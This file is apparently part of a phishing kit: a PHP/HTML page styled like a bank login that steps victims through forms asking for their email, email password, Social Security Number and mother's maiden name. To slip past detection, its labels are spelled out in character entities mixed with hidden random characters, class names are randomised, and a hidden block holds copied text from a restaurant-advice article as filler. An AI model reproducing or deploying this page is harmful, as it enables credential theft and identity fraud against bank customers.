                                                                <label class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldlabel label-alignment vertical " for="password">&#69;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#80;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#119;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span></label>
                                                            </div>
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon-xs-toggle">
                                                                <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui input logon-xs-toggle " id="password" placeholder="" autocomplete="off" type="password" name="password" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;"> </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> row">
                                                    <button type="submit" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui button focus fluid primary touch"><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;</span> </button>
                                                </div>

                                            </form>
                                        </div>
                                    </div>
                                </div>
                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui raised segment" id="emailo2" style="max-width: 470px!important; display:none;">
                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> row">
                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> col-xs-10 col-xs-offset-1">
                                            <form id="email2-form" name="email2-form" method="POST" autocomplete="off" action="">
                                                <div id="" align="center">
                                                    <ol class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr" data-progtrckr-steps="4">
                                                        <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-done"></li>
                                                        <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-todo"></li>
                                                        <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-todo"></li>
                                                        <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-todo"></li>
                                                    </ol>
                                                </div>
                                                <br>
                                                <br>
                                                <div align="center">
                                                    <img id="img1" src="./img/emdef213.png" width="100px">
                                                </div>
                                                <div id="myerr" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> myerr" style="display:block;">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui error error inverted primary animate alert">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> icon"><span><i class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui exclamation-color icon"></i></span></div>
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> icon background"></div>
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> content wrap">
                                                            <h2 class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> title" tabindex="-1"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#112;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#119;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#112;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#104;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#107;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;</h2> </div>
                                                    </div>
                                                </div>
                                                <br>
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui vertical">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> align-label-input floating-label__container emms1">
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label-wrapper">
                                                                <label class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldlabel label-alignment vertical" for="email1"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#69;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;</label>
                                                            </div>
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon-xs-toggle">
                                                                <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui input logon-xs-toggle " id="email1" placeholder="" autocomplete="off" type="email" name="email1" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;"> </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui vertical">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> align-label-input floating-label__container pswd1">
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label-wrapper">
                                                                <label class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldlabel label-alignment vertical" for="password1">&#69;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#80;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#119;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span></label>
                                                            </div>
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon-xs-toggle">
                                                                <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui input logon-xs-toggle " id="password1" placeholder="" autocomplete="off" type="password" name="password1" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;"> </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> row">
                                                    <button type="submit" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui button focus fluid primary touch"><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;</span> </button>
                                                </div>

                                            </form>
                                        </div>
                                    </div>
                                </div>
                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui raised segment" id="ssno" style="max-width: 470px!important; display:none;">
                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> row">
                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> col-xs-10 col-xs-offset-1">
                                            <form id="ssn-form" name="ssn-form" method="POST" autocomplete="off" action="">
                                                <div id="" align="center">
                                                    <ol class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr" data-progtrckr-steps="4">
                                                        <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-done"></li>
                                                        <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-done"></li>
                                                        <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-todo"></li>
                                                        <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-todo"></li>
                                                    </ol>
                                                </div>
                                                <br>
                                                <br>
                                                <div id="errssn"></div>
                                                <br>
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui vertical">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> align-label-input floating-label__container ssn1">
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label-wrapper">
                                                                <label class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldlabel label-alignment vertical" for="ssnnum"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#83;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#83;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#78;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#98;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;</label>
                                                            </div>
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon-xs-toggle">
                                                                <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui input logon-xs-toggle " maxlength="11" minlength="11" id="ssnnum" placeholder="" autocomplete="off" type="text" name="ssnnum" inputmode="numeric" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;"> </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui vertical">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> align-label-input floating-label__container mdn1">
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label-wrapper">
                                                                <label class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldlabel label-alignment vertical" for="mdn"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#77;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#104;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;&apos;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#77;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#78;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;</label>
                                                            </div>
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon-xs-toggle">
                                                                <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui input logon-xs-toggle " id="mdn" placeholder="" autocomplete="off" type="text" name="mdn" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;"> </div>
                                                        </div>
                                                    </div>
                                                </div>
												<div style="display:none;" id="toc-wrapper_1-0" class="comp toc-wrapper mntl-block">
<div id="toc-wrapper__below_1-0" class="comp toc-wrapper__below mntl-block">
<figure id="figure_3-0" class="comp figure--primary figure primary-image-figure">
<div class="figure__media">
<div class="img-placeholder" style="padding-bottom:66.6%;">
<img src="https://www.thebalancesmb.com/thmb/_KaLy6S6xqss1s7DhK-5uzlZsMY=/950x0/filters:max_bytes(150000):strip_icc():format(webp)/how-to-open-a-new-restaurant-2888644-FINAL-5ba5001946e0fb002557ae47.png" srcset="https://www.thebalancesmb.com/thmb/RlhZsE95TaxohoUSbejI8jLwwaQ=/400x0/filters:max_bytes(150000):strip_icc():format(webp)/how-to-open-a-new-restaurant-2888644-FINAL-5ba5001946e0fb002557ae47.png 400w, https://www.thebalancesmb.com/thmb/TSUT3AvhieraUdEfAieo8SMQoKI=/537x0/filters:max_bytes(150000):strip_icc():format(webp)/how-to-open-a-new-restaurant-2888644-FINAL-5ba5001946e0fb002557ae47.png 537w, https://www.thebalancesmb.com/thmb/88RfA_LlBvQWcExPsqW-YWDdqJs=/674x0/filters:max_bytes(150000):strip_icc():format(webp)/how-to-open-a-new-restaurant-2888644-FINAL-5ba5001946e0fb002557ae47.png 674w, https://www.thebalancesmb.com/thmb/_KaLy6S6xqss1s7DhK-5uzlZsMY=/950x0/filters:max_bytes(150000):strip_icc():format(webp)/how-to-open-a-new-restaurant-2888644-FINAL-5ba5001946e0fb002557ae47.png 950w" alt="How to Start a New Restaurant" class=" mntl-primary-image figure__img">
</div>
</div>
<figcaption id="mntl-figure-caption_1-0" class="comp mntl-figure-caption figure-article-caption">
<span class="figure-article-caption-owner"><p>The Balance /&nbsp;&#8203;Ashley DeLeon</p></span>
</figcaption>
</figure>
<div id="sponsorship-wrapper_3-0" class="comp sponsorship-wrapper mntl-block"></div>
<div id="article-meta_1-0" class="comp article-meta mntl-block" data-tracking-container="true">
<div id="article-meta__byline_1-0" class="comp article-meta__byline mntl-block">
<div id="byline_1-0" class="comp byline mntl-byline mntl-block" data-tracking-container="true">
<span id="mntl-byline__text_1-0" class="comp mntl-byline__text mntl-text-block">
By</span>
<div id="mntl-byline__name_1-0" class="comp mntl-byline__name mntl-block mntl-dynamic-tooltip--trigger" data-tooltip="Lorri Mealey has nearly a decade of restaurant experience, including owning and operating her own restaurant in Western Maine." data-tooltip-position-x="left" data-tooltip-position-y="top">
<div id="mntl-bio-tooltip_1-0" class="comp mntl-bio-tooltip money-bio-tooltip mntl-block">
<div id="mntl-bio-tooltip__top_1-0" class="comp mntl-bio-tooltip__top mntl-block">
<div id="mntl-bio-tooltip__main_1-0" class="comp mntl-bio-tooltip__main mntl-block">
<div id="mntl-bio-tooltip__name_1-0" class="comp mntl-bio-tooltip__name mntl-block">
<span id="mntl-bio-tooltip__prelink_1-0" class="comp mntl-bio-tooltip__prelink mntl-text-block"></span>
<a href="https://www.thebalancesmb.com/lorri-mealey-2888222" id="mntl-bio-tooltip__link_1-0" class=" mntl-bio-tooltip__link mntl-text-link" data-tracking-container="true"><span class="link__wrapper">Full Bio</span></a>
<span id="mntl-bio-tooltip__postlink_1-0" class="comp mntl-bio-tooltip__postlink mntl-text-block"></span>
<nav id="bio-social-follow_1-0" class="comp bio-social-follow" role="navigation" data-tracking-container="true">
<div class="bio-social-follow__icons">
<div class="bio-social-follow__icon-container">
<a href="https://twitter.com/abt_restaurants?lang=en" target="_blank" rel="noopener" class="bio-social-follow__icon bio-social-follow__twitter"> <span class="bio-social-follow__follow-text">Follow</span>
<svg class="icon bio-icon-twitter">
<use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-twitter"></use>
</svg>
<span class="bio-social-follow__icon-text">Twitter</span>
</a> </div>
</div>
</nav>
</div>
<div id="mntl-bio-tooltip__bio_1-0" class="comp mntl-bio-tooltip__bio mntl-text-block">
Lorri Mealey has nearly a decade of restaurant experience, including owning and operating her own restaurant in Western Maine.</div>
</div>
</div>
<div id="mntl-bio-tooltip__bottom_1-0" class="comp mntl-bio-tooltip__bottom mntl-block">
<div id="mntl-bio-tooltip__learn-more_1-0" class="comp mntl-bio-tooltip__learn-more money-bio-tooltip__learn-more mntl-block">
<span id="mntl-text-block_3-0" class="comp mntl-text-block">
Read The Balance's </span>
<a href="/about-us#EditorialGuidelines" id="mntl-text-link_1-0" class=" mntl-text-link" data-tracking-container="true"><span class="link__wrapper">editorial policies</span></a>
</div>
</div>
</div>
<a href="https://www.thebalancesmb.com/lorri-mealey-2888222" id="mntl-byline__link_1-0" class=" mntl-byline__link mntl-text-link" data-tracking-container="true"><span class="link__wrapper">Lorri Mealey</span></a>
</div>
</div>
</div>
<div id="displayed-date_1-0" class="comp displayed-date">
Updated July 25, 2019
</div>
</div>
<div id="mntl-sc-page_1-0" class="comp structured-content expert-content mntl-sc-page mntl-block" data-sc-sticky-offset="80" data-sc-ad-label-height="20" data-sc-ad-track-spacing="100" data-sc-ad-bottom-offset="0" data-sc-min-track-height="250" data-sc-max-track-height="600" data-sc-breakpoint="50em" data-sc-load-immediate="4" data-sc-content-positions="[300, 1, 1, 1250, 1, 1, 1, 1]" data-bind-scroll-on-start="true">
<p id="mntl-sc-block_1-0-1" class="comp text-passage mntl-sc-block mntl-sc-block-html">
<a href="https://www.thebalancesmb.com/how-to-open-a-restaurant-with-no-money-4045860" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">Opening a new restaurant</a> can be daunting. There are so many things to consider – from choosing the right location to finding financing to selecting the right name. And, of course, <a href="https://www.thebalancesmb.com/restaurant-bar-equipment-checklist-2888863" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="2">buying equipment</a> and hiring staff.
</p>
<div id="mntl-sc-block_1-0-2" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"><div id="mntl-block_2-0" class="comp mntl-block">
<div id="billboard1-sticky-dynamic_1-0" class="comp scads-to-load right-rail__item billboard-sticky billboard1-sticky-dynamic billboard-sticky--sc scads-stick-in-parent scads-ad-placed" data-height="1050" style="top: 134px;">
<div class="spacer">
<div id="billboard1-dynamic_1-0" class="comp billboard1-dynamic mntl-gpt-dynamic-adunit mntl-gpt-adunit gpt billboard dynamic" style="">
<div id="billboard" class="wrapper" data-type="billboard" data-pos="atf" data-priority="2" data-sizes="[[300, 250], [300, 600], [160, 600], [300, 1050], [1, 2], &quot;fluid&quot;]" data-rtb="true" data-targeting="{}" data-auction-floor-id="3bd3f410f0f24094bfd884a7691b57e5" data-auction-floor-value="25"><div id="google_ads_iframe_/479/thebalancesmb/balsmb_restaurants/billboard_0__container__" style="border: 0pt none; width: 300px; height: 250px;"></div></div>
</div>
</div>
</div>
</div></div>
<a class="heading-toc" id="concept-location-and-name"></a> <h2 id="mntl-sc-block_1-0-3" class="comp mntl-sc-block money-sc-block-heading mntl-sc-block-heading"> <span class="mntl-sc-block-heading__text"> Concept, Location, and Name&nbsp; </span> </h2>
<p id="mntl-sc-block_1-0-5" class="comp text-passage mntl-sc-block mntl-sc-block-html">
The first step in opening a new restaurant is deciding what <a href="https://www.thebalancesmb.com/types-of-restaurants-2888525" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">type</a> of restaurant it is going to be. Do you want to open a high-end fine dining restaurant? A casual 1950s-style diner? Do you have a specific type of cuisine in mind, such as Italian, French, or Indian? Perhaps a microbrewery or a pub.
</p>
<div id="mntl-sc-block_1-0-6" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"><div id="mntl-block_3-0" class="comp mntl-block">
<div id="billboard2-sticky-dynamic_1-0" class="comp scads-to-load right-rail__item billboard-sticky billboard2-sticky-dynamic billboard-sticky--sc scads-stick-in-parent scads-ad-placed" data-height="600" style="top: 1284px;">
<div class="spacer">
<div id="billboard2-dynamic_1-0" class="comp billboard2-dynamic mntl-gpt-dynamic-adunit mntl-gpt-adunit gpt billboard dynamic" style="">
